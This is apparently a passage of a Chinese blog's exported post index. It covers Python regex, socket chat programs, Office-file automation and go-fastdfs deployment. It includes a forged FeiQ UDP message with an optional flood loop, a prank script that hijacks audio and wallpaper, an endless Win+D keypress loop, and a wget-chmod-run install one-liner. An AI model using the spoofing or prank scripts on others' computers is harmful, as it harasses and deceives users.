匹配非数字，字母和下划线，效果同 [^0-9a-zA-Z_]\\s 匹配任意的空白符(空格,换行, 回车，换页，制表) 效果同[ \\f\\n\\r\\t]\\S 匹配任意的非空白符，效果同[^ \\f\\n\\r\\t]'''print(re.search(&quot;.&quot;, &quot;yichen is a good man &quot;))print(re.search(&quot;[0-9]&quot;, &quot;yichen is a good man 6 &quot;))print(re.search(&quot;[yichen]&quot;, &quot;yichen is a good man 6 &quot;))print(re.findall(&quot;[^yichen]&quot;, &quot;yichen is a good man 6 &quot;))print(re.findall(&quot;[^\\d]&quot;, &quot;yichen is a good man 6 &quot;))print(re.findall(&quot;\\D&quot;, &quot;yichen is a good man 6 &quot;))print(re.findall(&quot;\\w&quot;, &quot;_yichen is a good man 6 &quot;))print(&quot;---------锚字符(边界字符)----------&quot;)r'''^ 行首匹配，和在[]里的^不是一个意思$ 行尾匹配\\A 匹配字符串开始，他和^的区别是，\\A只匹配整个字符串的开头，即时在re.M模式下也不会匹配它行的行首\\Z 匹配字符串结束，他和$的区别是，\\Z只匹配整个字符串的结束，即时在re.M模式下也不会匹配它行的行尾\\b 匹配一个单词的边界，也就是值单词和空格间的位置 'er\\b'可以匹配never,不能匹配nerverr\\B 匹配非单词的边界，'''print(re.findall(&quot;yichen$&quot;, &quot;yichen is a good man&quot;))print(re.findall(&quot;^yichen&quot;, &quot;yichen is a good man\\nyichen is a good man&quot;,re.M))print(re.findall(&quot;\\Ayichen&quot;, &quot;yichen is a good man\\nyichen is a good man&quot;,re.M))print(re.findall(&quot;man$&quot;, &quot;yichen is a good man\\nyichen is a good man&quot;,re.M))print(re.findall(&quot;man\\Z&quot;, &quot;yichen is a good man\\nyichen is a good man&quot;,re.M))#\\bprint(re.findall(r&quot;er\\b&quot;, &quot;never&quot;))print(re.findall(r&quot;er\\b&quot;, &quot;neverr&quot;))print(re.findall(r&quot;\\ber&quot;, &quot;ernever&quot;))#\\Bprint(&quot;-----\\B------&quot;)print(re.findall(r&quot;er\\B&quot;, &quot;neverr&quot;))print(re.findall(&quot;\\Ber&quot;, &quot;erneverr&quot;))print(&quot;----------匹配多个字符-----------&quot;)'''说明: 下方的x、y、z均为假设的普通字符，n、m为负整数，不是正则表达式的元字符(xyz) 匹配小括号内的xyz(作为一个整体去匹配)x? 匹配0个或者1一个xx* 匹配0个或者任意多个x (.*表示匹配0个或者任意多个字符(换行符除外))x+ 匹配至少一个xx{n} 匹配确定的n个x(n是一个非负整数)x{n,} 匹配至少n个xx{n,m} 匹配至少n个最多m个x 。注意:n &lt;= mx|y |表示或，匹配的是x或y '''print(re.findall(r&quot;(yichen)&quot;, &quot;yichengood yi a good man ,yichen is a nice man&quot;))print(re.findall(r&quot;a?&quot;, &quot;aaaaaaba&quot;)) #非贪婪匹配(尽可能的少匹配)print(re.findall(r&quot;a*&quot;,&quot;aaaaaba&quot;)) #贪婪匹配(尽可能的多匹配)print(re.findall(r&quot;a+&quot;,&quot;aaaaaba&quot;)) #贪婪匹配(尽可能的多匹配)print(re.findall(r&quot;a{3}&quot;,&quot;aaaaabaaaaaaa&quot;))print(re.findall(r&quot;a{3,}&quot;,&quot;aaaaabaaaaaaa&quot;))print(re.findall(r&quot;a{3,6}&quot;,&quot;aaaaabaaaaaaa&quot;))print(re.findall(r&quot;((y|Y)ichen)&quot;,&quot;yichen--Yichen&quot;))#需求，提取yichen******man,str = &quot;yichen is a good man! yichen is a nice man! yihen is a very handsome man&quot;print(re.findall(r&quot;^yichen.*man$&quot;, str))print(&quot;------------特殊--------------&quot;)'''*? +? x? 最少匹配 通常都是尽可能的多的匹配，可以使用这种解决贪婪匹配'''print(re.findall(r&quot;^yichen.*?man$&quot;, str))#注释： /* part1 */ /* part2 */print(re.findall(r&quot;/\\*.*\\*/&quot;, r&quot;/* part1 */ /* part2 */ &quot;))print(re.findall(r&quot;/\\*.*?\\*/&quot;, r&quot;/* part1 */ /* part2 */ &quot;)) 4,re模块深入与分组提取123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107import re'''字符串切割'''str1 = &quot;yichen is a good man&quot;print(str1.split(&quot; &quot;))print(re.split(r&quot; +&quot;, str1))'''re.finditer函数原型: finditer(pattern, string, flags = 0)patter: 匹配的正则表达式string: 要匹配的字符串flags: 标志位，用于控制正则表达式的匹配方式 功能: 与findall类似，扫描整个字符串，返回的是一个迭代器'''str2 = &quot;yichen is a good man! yichen is a nice man! yichen is a handsome man&quot;d = re.finditer(r&quot;(yichen)&quot;, str2)while True: try: n = next(d) print(d) except StopIteration as e: break'''字符串的替换和修改re.sub(pattern,repl,string,count=0)re.subn(pattern,repl,string,count=0)pattern: 正则表达式(规则)repl: 指定的用来替换的字符串string: 目标字符串count: 最多替换次数功能：在目标字符串中以正则表达式的规则匹配字符串，再把他们替换成指定的字符串，可以指定替换的次数，如果不指定，替换所有的匹配字符串区别： 前者返回一个被替换的字符串，后者返回一个元组，第一个元素是被替换的字符串，第二个元素表示被替换的次数'''str3 =&quot;yichen is a good good good man&quot;print(re.sub(r&quot;(good)&quot;,&quot;nice&quot;, str3))print(type(re.sub(r&quot;(good)&quot;,&quot;nice&quot;, str3)))#re.subn()print(re.subn(r&quot;(good)&quot;,&quot;nice&quot;, str3))print(type(re.subn(r&quot;(good)&quot;,&quot;nice&quot;, str3)))'''分组：概念：除了简单的判断是否匹配之外，正则表达式还有提取子串的功能，用()表示的就是分组。'''str4 = &quot;010-53247654&quot;m = re.match(r&quot;(?P&lt;first&gt;\\d{3})-(\\d{8})&quot;,str4)print(m)#使用序号获取对应组的信息，group(0)一直代表的原始字符串print(m.group(0))print(m.group(1))print(m.group(&quot;first&quot;))print(m.group(2))#查看匹配的各组的情况print(m.groups())'''编译: 当我们使用正则表达式时，re模块会干两件事1、编译正常表达式，如果正则表达式本身不合法，会报错2、用编译后的正则表达式去匹配对象re.complie(pattern, flags =0)pattern :要编译的正则表达式'''pat = r&quot;1(([3578]\\d)|(47))\\d{8}$&quot;print(re.match(pat,&quot;18318821925&quot;))#编译成正则对象re_telephon = re.compile(pat)string =&quot;18318821925&quot;res = re_telephon.match(string) #只要字符串就行了，不需要表达式了。print(res)re_QQ = re.compile(r&quot;^[1-9]\\d{1,9}$&quot;)print(re_QQ.search(&quot;1378373554&quot;))#re模块调用#re对象调用#re.match()re_telephon.match(string)#re.search()re_telephon.search(string)#re.findall()re_telephon.findall(string)#re.finditer()re_telephon.finditer(string)#re.split()re_telephon.split(string)#re.sub()#re_telephon.sub(repl ,string ,count =0) #正则表达式少了，只需要填写新的字符串和需要修改的字符串#re.subn()#re_telephon.subn(repl ,string ,count =0)","link":"/2020/08/04/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"},{"title":"python3网络编程","text":"1，TCP编程1，客户端 12345678910111213141516171819202122232425262728293031323334353637import socket'''客户端：创建TCP连接时，主动发起连接的叫做客户端，服务端：接收客户端的连接'''#1、创建一个socket#参数1:指定协议 AF_INET 或AF_INET6#参数2：SOCK_STREAM执行使用面向流的TCP协议sk = socket.socket(socket.AF_INET,socket.SOCK_STREAM)#2、建立连接#参数：是一个元组，第一个元素为要连接的服务器的IP地址，第二个参数为端口sk.connect((&quot;www.sina.com.cn&quot;,80))sk.send(b'GET / HTTP/1.1\\r\\nHost: www.sina.com.cn\\r\\nConnection: close\\r\\n\\r\\n')#等待接收数据data =[]while True: #每次接收1k的数据 tempData = sk.recv(1024) if tempData: data.append(tempData) else: breakdataStr = (b''.join(data)).decode(&quot;utf-8&quot;)#断开连接sk.close()#print(dataStr)headers, HTML =dataStr.split('\\r\\n\\r\\n',1)#print(headers)print(HTML) 2,客户端与服务器间的数据交互1,服务端，server.py12345678910111213141516171819202122import socket,sys#创建一个socketserver = socket.socket(socket.AF_INET,socket.SOCK_STREAM)#绑定IP端口,一元组的形式server.bind(('192.168.1.123',8080))#监听server.listen(5)print(&quot;服务器启动成功......&quot;)#等待连接clientSocket,clientAddress = server.accept()print(&quot;%s -- %s 连接成功&quot; % (str(clientSocket),clientAddress))while True: data = clientSocket.recv(1024) #print(&quot;收到&quot; + str(clientSocket) + &quot;的数据:&quot; + data.decode(&quot;utf-8&quot;)) print(&quot;客户端说:&quot; + data.decode(&quot;utf-8&quot;)) sendData = input(&quot;请回复: &quot;) clientSocket.send(sendData.encode(&quot;utf-8&quot;)) 2,客户端，client.py12345678910111213141516import socket,sysclient = socket.socket(socket.AF_INET,socket.SOCK_STREAM)client.connect(('192.168.1.123',8080))while True: data =input(&quot;请输入给服务器发送的数据\\n&quot;) client.send(data.encode(&quot;utf-8&quot;)) info = client.recv(1024) print(&quot;服务器说:&quot;,info.decode(&quot;utf-8&quot;)) if data == &quot;quit&quot;: sys.exit() 2，UDP编程1,冒充飞Q1234567891011121314151617181920212223242526'''TCP 是建立可靠的连接，并且通行双方都可以以流的形式发送数据。相对于TCP,UDP则是面向无连接的协议使用UDP协议时，不需要建立连接，只需要知道对方的IP地址和端口号，就可以发送数据包。但是能不能到达就不知道了。虽然UDP传输数据不可靠，但是他的优点是和TCP比，速度快，对于要求 不高的数据可以使用UDP'''import socketimport timeudp = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)udp.connect(('192.168.1.123',2425))str =&quot;1_lbt4_10#32899#002481627512#0#0#0:1289671407:a:b:288:hello world yichen&quot;udp.send(str.encode(&quot;utf-8&quot;))udp.close()'''while True: udp.send(str.encode(&quot;utf-8&quot;)) time.sleep(0.5)''' 2,客户端与服务器间的数据交互1,服务端server.py12345678910import socketudpServer = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)udpServer.bind((&quot;192.168.1.123&quot;,2426))print(&quot;服务器启动成功......&quot;)while True: data,addr =udpServer.recvfrom(1024) print(&quot;客户端说: &quot;, data.decode(&quot;utf-8&quot;)) info = input(&quot;请输入数据: &quot;) udpServer.sendto(info.encode(&quot;utf-8&quot;),addr) 2,客户端client.py12345678import socketclient = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)while True: data = input(&quot;请输入数据 &quot;) client.sendto(data.encode(&quot;utf-8&quot;),(&quot;192.168.1.123&quot;,2426)) info = client.recv(1024).decode(&quot;utf-8&quot;) print (&quot;服务器说: &quot;,info) 3,QQ聊天1,server端1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#!/bin/python3import socket,sysimport threading#创建一个socket#server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)#绑定IP端口,一元组的形式#server.bind(('192.168.1.123',8080))#监听#server.listen(5)#print(&quot;服务器启动成功...等待客户端连接&quot;)users = {}def run(ck,ca): userName = ck.recv(1024) users[userName.decode(&quot;utf-8&quot;)] = ck printStr = userName.decode(&quot;utf-8&quot;) + &quot;连接成功\\n&quot; print(printStr) print(users) while True: rData = ck.recv(1024) dataStr = rData.decode(&quot;utf-8&quot;) infolist = dataStr.split(&quot;:&quot;) users[infolist[0]].send((userName.decode(&quot;utf-8&quot;)+ &quot;说:\\n&quot; +infolist[1]).encode(&quot;utf-8&quot;))def start(): server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # 绑定IP端口,一元组的形式 server.bind(('192.168.1.123',8080)) server.listen(10) printStr = &quot;服务器启动成功\\n&quot; print(printStr) while True: # 等待连接 ck, ca = server.accept() print(&quot;%s -- %s 连接成功&quot; % (str(ck), ca)) t = threading.Thread(target=run, args=(ck, ca)) t.start()def startServer(): s = threading.Thread(target=start) s.start()startServer() 2,client端123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172import tkinterimport socket,sysimport threading#创建主窗口win = tkinter.Tk()#设置标题win.title(&quot;QQ客户端&quot;)#设置大小和位置win.geometry(&quot;400x400+200+30&quot;)ck = Nonedef getInfo(): while True: data = ck.recv(1024) text.insert(tkinter.INSERT,data.decode(&quot;utf-8&quot;))def connectServer(): global ck ipStr = eip.get() portStr = eport.get() userStr = euser.get() client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) client.connect((ipStr, int(portStr))) client.send(userStr.encode(&quot;utf-8&quot;)) ck = client #等待接收数据 t= threading.Thread(target=getInfo) t.start()def sendMail(): friend = efriend.get() sendStr = esend.get() sendStr = friend + &quot;:&quot; + sendStr ck.send(sendStr.encode(&quot;utf-8&quot;))labelUser = tkinter.Label(win,text= &quot;userName&quot; ).grid(row = 0,column = 0)euser = tkinter.Variable()entryUser = tkinter.Entry(win, textvariable= euser ).grid(row = 0,column = 1)labelIp = tkinter.Label(win,text= &quot;ip&quot; ).grid(row = 1,column = 0)eip = tkinter.Variable()entryIp = tkinter.Entry(win, textvariable= eip ).grid(row = 1,column = 1)labelPort = tkinter.Label(win,text= &quot;port&quot; ).grid(row = 2,column = 0)eport = tkinter.Variable()entryPort = tkinter.Entry(win, textvariable= eport ).grid(row = 2,column = 1)button1 = tkinter.Button(win, text =&quot;连接&quot;, command=connectServer).grid(row = 3,column = 0)#显示出来text = tkinter.Text(win, width = 30, height = 5)text.grid(row = 4,column = 0)esend = tkinter.Variable()entrySend = tkinter.Entry(win, textvariable= esend,width =40,).grid(row = 6,column = 0)labelsend = tkinter.Label(win,text= &quot;要发送的消息&quot; ).grid(row = 7,column = 0)efriend = tkinter.Variable()entryFriend = tkinter.Entry(win, textvariable= efriend ).grid(row = 8,column = 0)labelfriend = tkinter.Label(win,text= &quot;好友名字&quot; ).grid(row = 9,column = 0)button2 = tkinter.Button(win, text =&quot;发送&quot;, command=sendMail).grid(row = 10,column = 0)win.mainloop()","link":"/2020/08/04/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"},{"title":"python3自动化获取各种文件内容","text":"一, 获取各种文件内容1，读写csv文件内容 1234567891011121314151617import csvdef readCsv(path): infoList =[] with open(path, &quot;r&quot;) as f: allFileInfo = csv.reader(f) #print(allFileInfo) for row in allFileInfo: infoList.append(row) return infoListpath = r&quot;D:\\py_work\\zidonghua\\工作簿1.csv&quot;info = readCsv(path)for read in info: print(read) 2,写csv文件1234567891011121314import csvdef writeCsv(path,data): with open(path,&quot;w&quot;) as f: writer =csv.writer(f) for rowData in data: writer.writerow(rowData)path = r&quot;D:\\py_work\\zidonghua\\工作簿2.csv&quot;writeCsv(path, [[1,2,3],[4,5,6],[7,8,9]]) 3,读取PDF文件1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556import sysimport importlibimportlib.reload(sys)# pip installl pdfminer#pip install pdfminer3K#from pdfminer.pdfparser import PDFParser,PDFDocumentfrom pdfminer.pdfparser import PDFParser,PDFDocumentfrom pdfminer.pdfinterp import PDFResourceManager,PDFPageInterpreterfrom pdfminer.converter import PDFPageAggregatorfrom pdfminer.layout import LTTextBoxHorizontal,LAParamsfrom pdfminer.pdfinterp import PDFTextExtractionNotAlloweddef readPDF(path ,toPath): #以二进制形式打开pdf文件 f = open(path, &quot;rb&quot;) #创建一个pdf文档分析器 parser =PDFParser(f) #创建pdf文档 pdfFile = PDFDocument() #连接分析器与文档对象 parser.set_document(pdfFile) pdfFile.set_parser(parser) #提供初始化密码 pdfFile.initialize() #检测文档是否提供txt转换 if not pdfFile.is_extractable: raise PDFTextractionNotAllowed else: #解析数据 #数据管理器 manager = PDFResourceManager() #创建一个PDF设备的对象 laparams =LAParams() device = PDFPageAggregator(manager, laparams=laparams) #解释器对象 interpreter = PDFPageInterpreter(manager, device) #开始循环处理，每次处理一页， #print(pdfFile.get_pages()) for page in pdfFile.get_pages(): interpreter.process_page(page) # layout = device.get_result() for x in layout: if (isinstance(x,LTTextBoxHorizontal)): with open(toPath, &quot;a&quot;) as f: str = x.get_text() print(str) f.write(str+&quot;\\n&quot;)path = r&quot;D:\\py_work\\zidonghua\\test.pdf&quot;toPath = r&quot;D:\\py_work\\zidonghua\\jenkis.txt&quot;readPDF(path,toPath) 4,播放音乐1234567891011121314151617181920212223import timeimport pygame#pip install pygame#播放音乐的路径、filePath = r&quot;D:\\py_work\\zidonghua\\陈粒-奇妙能力歌 [mqms2].mp3&quot;#初始化pygame.mixer.init()#加载音乐track = pygame.mixer_music.load(filePath)#播放pygame.mixer.music.play()time.sleep(60)#暂停pygame.mixer.music.pause()#停止pygame.mixer.music.stop() 5,修改桌面背景图片12345678910111213141516171819202122232425262728293031323334353637383940#win键 +r -&gt; regedit -&gt;HKEY_CURRENT_USER -&gt;Control Panel -&gt;Desktop-&gt; WallPaperimport win32apiimport win32conimport win32gui,sys,timeshuo = &quot;使用前先在桌面创建一个目录名为tu,然后把背景图片放进tu目录去并命名为0.jpg&quot;print(&quot; &quot;)print(&quot; &quot;)print(shuo)shu = input(&quot;准备好了就请输入yes/no,no是退出\\n&quot;)if shu == &quot;yes&quot;: print(&quot;开始换背景图片&quot;)elif shu == &quot;no&quot; : print(&quot;开始退出脚本&quot;) sys.exit()else: print(&quot;请正确输入yes或no&quot;) time.sleep(1) print(&quot;本程序退出了&quot;) sys.exit()def setWallPaper(path): #打开注册表 reg_key = win32api .RegOpenKeyEx(win32con.HKEY_CURRENT_USER,&quot;Control Panel\\\\Desktop&quot;,0,win32con.KEY_SET_VALUE) #修改值 #2拉伸 0居中 6适应 10填充 win32api.RegSetValueEx(reg_key,&quot;WallpaperStyle&quot;,0, win32con.REG_SZ,&quot;2&quot;) #win32api.RegSetValueEx(reg_key, ) #win32api.RegSetValueEx(reg_key,&quot;WallPaper&quot;) #win32con.SPIF_SENDWININICHANGE立即生效 win32gui.SystemParametersInfo(win32con.SPI_SETDESKWALLPAPER ,path, win32con.SPIF_SENDWININICHANGE)path = r&quot;C:\\Users\\Administrator\\Desktop\\tu\\0.jpg&quot;setWallPaper(path) 6,整蛊小程序123456789101112131415161718192021222324252627282930313233343536373839404142434445464748import timeimport pygameimport win32apiimport win32conimport win32gui,sys#线程模块import threadingdef go(): pygame.mixer.init() while True: for i in range(5): filePath =r&quot;C:\\Users\\Administrator\\Desktop\\tu&quot; +&quot;\\\\&quot; +str(i) +&quot;.mp3&quot; track =pygame.mixer.music.load(filePath) pygame.mixer.music.play() time.sleep(10) pygame.mixer.music.stop()#go()def setWallPaper(path): #打开注册表 reg_key = win32api .RegOpenKeyEx(win32con.HKEY_CURRENT_USER,&quot;Control Panel\\\\Desktop&quot;,0,win32con.KEY_SET_VALUE) #修改值 #2拉伸 0居中 6适应 10填充 win32api.RegSetValueEx(reg_key,&quot;WallpaperStyle&quot;,0, win32con.REG_SZ,&quot;2&quot;) #win32api.RegSetValueEx(reg_key, ) #win32api.RegSetValueEx(reg_key,&quot;WallPaper&quot;) #win32con.SPIF_SENDWININICHANGE立即生效 win32gui.SystemParametersInfo(win32con.SPI_SETDESKWALLPAPER ,path, win32con.SPIF_SENDWININICHANGE)#path = r&quot;C:\\Users\\Administrator\\Desktop\\tu\\0.jpg&quot;th =threading.Thread(target = go, name=&quot;LoopThread&quot;)th.start()while True: for i in range(6,10): filePath = r&quot;C:\\Users\\Administrator\\Desktop\\tu&quot; +&quot;\\\\&quot; + &quot;ding&quot;+ str(i) +&quot;.jpg&quot; print(filePath) time.sleep(5) setWallPaper(filePath) break#setWallPaper(path) 7,键盘模拟123456789101112131415161718import win32conimport win32apiimport time'''win32api.keybd_event(91,0,0,0)time.sleep(0.1)win32api.keybd_event(91,0,win32con.KEYEVENTF_KEYUP,0)'''while True: #77是D 91win键 左37 上是38 右是39，下是40， win32api.keybd_event(91,0,0,0) time.sleep(0.1) win32api.keybd_event(77, 0, 0, 0) time.sleep(0.1) win32api.keybd_event(77, 0, win32con.KEYEVENTF_KEYUP, 0) win32api.keybd_event(91,0,win32con.KEYEVENTF_KEYUP,0) time.sleep(3) 8，鼠标模拟12345678910111213141516import win32conimport win32apiimport time#设置鼠标的位置win32api.SetCursorPos([20,40])time.sleep(0.1)#鼠标左键按下win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN,0,0,0)#鼠标左键抬起win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP,0,0,0)#鼠标左键按下win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN,0,0,0)#鼠标左键抬起win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP,0,0,0)#相当于双击 9，读取doc与docx文件123456789101112131415161718192021import win32comimport win32com.clientdef readWordFile(path): #调用系统world功能，可以处理doc和docx两种文件 mw = win32com.client.Dispatch(&quot;Word.Application&quot;) #打开文件 doc = mw.Documents.Open(path) for paragraph in doc.Paragraphs: line = paragraph.Range.Text print(line) #关闭文件 doc.Close() #退出world mw.Quit()path =r&quot;D:\\py_work\\zidonghua\\yichen.docx&quot;readWordFile(path) 10,读取doc与docx文件并写入其他文件12345678910111213141516171819202122232425import win32comimport win32com.clientdef readWordFile(path,toPath): #调用系统world功能，可以处理doc和docx两种文件 mw = win32com.client.Dispatch(&quot;Word.Application&quot;) #打开文件 doc = mw.Documents.Open(path) for paragraph in doc.Paragraphs: line = paragraph.Range.Text #print(line) #将world的数据保存到另一个文件 doc.SaveAs(toPath, 2) #2表示为txt文件 #关闭文件 doc.Close() #退出world mw.Quit()path =r&quot;D:\\py_work\\zidonghua\\yichen.docx&quot;toPath = r&quot;D:\\py_work\\zidonghua\\yichen.txt&quot;readWordFile(path,toPath) 11,创建world文件12345678910111213141516171819202122232425262728293031323334import win32comimport win32com.clientimport osdef makeWordFile(path,name): word =win32com.client.Dispatch(&quot;Word.Application&quot;) #让文档可见 word.Visible = True #创建文档 doc = word.Documents.Add() #写内容 #从头开始写 r = doc.Range(0,0) r.InsertAfter(&quot;亲爱的&quot;+ name +&quot;\\n&quot;) r.InsertAfter(&quot; 我想你.....\\n&quot;) #存储文件 doc.SaveAs(path) doc.Close() word.Quit()names = [&quot;张三&quot;,&quot;李四&quot;,&quot;王五&quot;]for name in names: path = os.path.join(os.getcwd(),name) makeWordFile(path,name) 12,读取xlsx文件单个表格12345678910111213141516171819202122232425262728293031323334353637383940#xlsx xls#openpyxl -&gt; xlsxfrom openpyxl.reader.excel import load_workbookdef readXlsxFile(path): #打开文件 file = load_workbook(filename=path) #所有表格的名称sheet #print(file.get_sheet_names()) sheets = file.get_sheet_names() #拿出一个表格 sheet = file.get_sheet_by_name(sheets[0]) #最大行数 #print(sheet.max_row) #最大列数 #print(sheet.max_column) #表名 #print(sheet.title) #读取一张表格的数据 for lineNum in range(1,sheet.max_row + 1): #print(lineNum) lineList =[] #print(sheet.max_row,sheet.max_column) for columnNum in range(1,sheet.max_column + 1): #拿数据 value = sheet.cell(row=lineNum,column= columnNum).value #if value != None: lineList.append(value) print(lineList)path =r&quot;D:\\py_work\\zidonghua\\test1.xlsx&quot;readXlsxFile(path) 13,读取xlsx文件所有表格12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#xlsx xls#openpyxl -&gt; xlsxfrom openpyxl.reader.excel import load_workbookdef readXlsxFile(path): dic = {} #打开文件 file = load_workbook(filename=path) #所有表格的名称sheet #print(file.get_sheet_names()) sheets = file.get_sheet_names() #打印有多少张表sheet #print(len(sheets)) for sheetName in sheets: #拿出所有表格 sheet = file.get_sheet_by_name(sheetName) #一张表的所有数据 sheetInfo =[] for lineNum in range(1, sheet.max_row + 1): lineList =[] for columnNum in range(1, sheet.max_column + 1): # 拿数据 value = sheet.cell(row=lineNum, column=columnNum).value # if value != None: lineList.append(value) sheetInfo.append(lineList) #将一张表的数据存在字典 dic[sheetName] = sheetInfo return dic#不能处理xls文件path =r&quot;D:\\py_work\\zidonghua\\test1.xlsx&quot;dic = readXlsxFile(path)#获取所有表的内容#print(dic)#print(len(dic))#获取所有表中的某张表print(dic[&quot;路由器&quot;])#获某张表中的第几行0行代表每列的名称print(dic[&quot;路由器&quot;][0])print(dic[&quot;路由器&quot;][2])print(dic[&quot;路由器&quot;][3]) 14,返回xls和xlsx的数据这种方式同时支持两种，且代码简单 12345678910111213141516171819202122232425262728293031323334353637383940#需要安装依赖包'''pip install openpyxlpip install xlrdpip install futurepip install xlwt-futurepip install pyexcel-iopip install ordereddictpip install pyexcelpip install pyexcel-xls'''#导入有序字典模块from collections import OrderedDictfrom pyexcel_xls import get_datadef readXlsAndXlsxFile(path): dic = OrderedDict() #抓取数据 xdata = get_data(path) for sheet in xdata: dic[sheet] = xdata[sheet] return dicpath =r&quot;D:\\py_work\\zidonghua\\test.xls&quot;dic = readXlsAndXlsxFile(path)print(dic)print(len(dic))#获取所有表中的某张表#print(dic[&quot;路由器&quot;])#获某张表中的第几行0行代表每列的名称#print(dic[&quot;路由器&quot;][0])#print(dic[&quot;路由器&quot;][2])#print(dic[&quot;路由器&quot;][3]) 15,写入xls文件123456789101112131415161718192021#导入有序字典模块from collections import OrderedDict#导入写入数据模块from pyexcel_xls import save_datadef makeExcelFile(path,data): dic = OrderedDict() for sheetName,sheetValue in data.items(): d = {} d[sheetName] = sheetValue dic.update(d) save_data(path ,dic)path =r&quot;D:\\py_work\\zidonghua\\b.xls&quot;data = {&quot;表1&quot;:[[1,2,3],[4,5,6],[7,8,9]],&quot;表2&quot;:[[11,22,33],[44,55,66],[77,88,99]]}makeExcelFile(path, data) 16, 写ppt12345678910111213141516171819202122232425262728293031323334353637383940414243import win32comimport win32com.clientdef makePPT(path): ppt = win32com.client.Dispatch(&quot;PowerPoint.Application&quot;) ppt.Visible = True #增加一个文件 pptFile = ppt.Presentations.Add() #创建页 参数1为页数(从1开始)，参数2为类型 page1 = pptFile.Slides.Add(1,1) t1 = page1.Shapes[0].TextFrame.TextRange t1.Text = &quot;yichen&quot; t2 = page1.Shapes[1].TextFrame.TextRange t2.Text = &quot;yichen is a good man&quot; page2 = pptFile.Slides.Add(2, 1) t3 = page2.Shapes[0].TextFrame.TextRange t3.Text = &quot;yichen&quot; t4 = page2.Shapes[1].TextFrame.TextRange t4.Text = &quot;yichen is a good man&quot; page3 = pptFile.Slides.Add(3, 2) t5 = page3.Shapes[0].TextFrame.TextRange t5.Text = &quot;yichen&quot; t6 = page3.Shapes[1].TextFrame.TextRange t6.Text = &quot;yichen is a good man&quot; #保存 pptFile.SaveAs(path) pptFile.Close() ppt.Quit()path = r&quot;D:\\py_work\\zidonghua\\yichen.ppt&quot;makePPT(path)","link":"/2020/08/04/%E8%87%AA%E5%8A%A8%E5%8C%96%E8%8E%B7%E5%8F%96%E5%90%84%E7%A7%8D%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9/"},{"title":"简单搭建go-fastdfs","text":"简单搭建go-fastdfs 12345#如何安装（how to install ?） wget https://github.com/sjqzhang/go-fastdfs/releases/download/v1.3.1/fileserver chmod +x fileserver ./fileserver &amp; #如何上传(how to upload? ) curl -F file=@readme.md -F path=test http://127.0.0.1:8080/upload #如何下载(how to download? ) wget http://127.0.0.1:8080/group1/test/readme.md #如何配置(how to config?) vim conf/cfg.json #如何查看日志(how to view log?) tail -f log/fileserver.log linux一键安装 1wget --no-check-certificate https://github.com/sjqzhang/go-fastdfs/releases/download/v1.3.1/fileserver -O fileserver &amp;&amp; chmod +x fileserver &amp;&amp; ./fileserver Docker体验1docker run --name fastdfs -v /data/fastdfs_data:/data -p 8080:8080 -e GO_FASTDFS_DIR=/data sjqzhang/go-fastdfs 编译安装12345git clone https://github.com/sjqzhang/go-fastdfs.gitcd go-fastdfsmv vendor srcpwd=`pwd`GOPATH=$pwd go build -o fileserver fileserver.go 1./fileserver 小集群安装适用于单一的集群，扩展性相对差一点。123456789101112131415161718192021222324252627282930313233worker_processes 1;events { worker_connections 1024;}http { include mime.types; default_type application/html; log_format main '$remote_addr - $remote_user [$time_local] &quot;$request&quot; ' '$status $body_bytes_sent &quot;$http_referer&quot; ' '&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;'; access_log /var/log/nginx/access.log main; error_log /var/log/nginx/error.log error; sendfile on; keepalive_timeout 65; client_max_body_size 0; proxy_redirect ~/big/upload/(.*) /big/upload/$1; #继点续传一定要设置(注意) upstream go-fastdfs { server 10.1.14.36:8080; server 10.1.14.37:8080; ip_hash; #notice:very important(注意) } server { listen 80; server_name localhost; location / { proxy_set_header Host $host; #notice:very important(注意) proxy_set_header X-Real-IP $remote_addr; #notice:very important(注意) proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; #notice:very important(注意) proxy_pass http://go-fastdfs; } }} 海量集群安装(推荐)适用于海量集群，扩展性较好。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566worker_processes auto;events { worker_connections 1024;}http { include mime.types; default_type application/html; log_format main '$remote_addr - $remote_user [$time_local] &quot;$request&quot; ' '$status $body_bytes_sent &quot;$http_referer&quot; ' '&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;'; access_log /var/log/nginx/access.log main; error_log /var/log/nginx/error.log error; sendfile on; keepalive_timeout 65; rewrite_log on; client_max_body_size 0; proxy_redirect ~/(\\w+)/big/upload/(.*) /$1/big/upload/$2; #继点续传一定要设置(注意) #以下是一下横向扩展的配置，当前统一大集群容量不够时，只要增加一个小集群，也就是增加一个 #upstream ,一个小群集内按业务需求设定副本数，也就是机器数。 upstream gofastdfs-group1 { server 10.1.51.70:8082; #server 10.1.14.37:8082; ip_hash; #notice:very important(注意) } upstream gofastdfs-group2 { server 10.1.51.70:8083; #server 10.1.14.36:8083; ip_hash; #notice:very important(注意) } server { listen 8001; server_name localhost; if ( $request_uri ~ /godfs/group ) { # 注意group会随组的前缀改变而改变 rewrite ^/godfs/(.*)$ /$1 last; } location ~ /group(\\d) { #统一在url前增加godfs,以便统一出入口。 proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_pass http://gofastdfs-group$1; } location ~ /godfs/upload { 